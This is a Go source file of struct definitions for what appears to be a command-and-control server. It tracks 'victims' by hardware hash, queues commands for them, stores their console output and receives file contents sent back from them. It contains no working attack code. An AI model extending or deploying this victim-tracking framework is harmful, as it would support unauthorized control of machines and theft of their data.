package main

import "time"

/*
case "response/json"       paired with ResponseCode
case "victimregister/json" paired with VictimRegister
case "requestCommand/json" paired with IncomingVictimRequest struct
case "incomingData/json"   paired with incoming superCat data
*/

type VictimInfo struct {
	Commands     		[]VictimCommand
	VictimInfo   		VictimRegister
	VictimConsoleOutput []string
	CreatedTime			time.Time //initialize this with this now := time.Now()
	LastSeen			time.Time //time of last contact use now := time.Now()
}

// storage structure for victim commands
type VictimCommand struct {
	Commandytype string
	Arguments    []string
}

type IncomingVictimRequest struct {
	HardwareHash string //who is making this request
}

type IncomingSuperCatData struct {
	Hash     string
	Filename string
	Content  string // base64 or raw content
}

type VictimRegister struct {
	HardwareHash    string
	OperatingSystem string
}

type AssimilateResponse struct {
	ResponseString string
	ResponseCode   int
}

type VictimOutputFlow struct {
	HardwareHash 	 string //who is making this request
	GenerationSource string
	Data 		 	 string
}


